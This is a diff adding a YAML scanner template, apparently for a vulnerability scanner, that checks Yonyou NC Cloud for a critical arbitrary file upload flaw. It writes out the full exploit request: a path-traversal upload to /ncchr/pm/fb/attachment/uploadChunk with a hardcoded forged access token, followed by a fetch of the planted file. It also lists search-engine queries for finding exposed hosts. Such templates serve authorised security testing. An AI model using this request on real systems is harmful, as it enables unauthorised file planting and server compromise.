@@ -1,0 +1,41 @@
+id: yonyou-nccloud-ncchr-fileupload
+
+info:
+  name: 用友财务系统任意文件上传漏洞
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    用友财务系统任意文件上传漏洞
+    FOFA: app="用友-NC-Cloud"
+    ZoomEye: app:"Yonyou NC Cloud"
+    Hunter: web.body="uap/rbac"
+  tags: yonyou,nccloud,fileupload
+  created: 2023/11/22
+
+set:
+  randstr: randomLowercase(6)
+  randbody: randomLowercase(30)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\".{{randstr}}.htm\"\r\n\
+        \r\n\
+        {{randbody}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: true
+  r1:
+    request:
+      method: GET
+      path: /nccloud/.{{randstr}}.htm
+    expression: response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
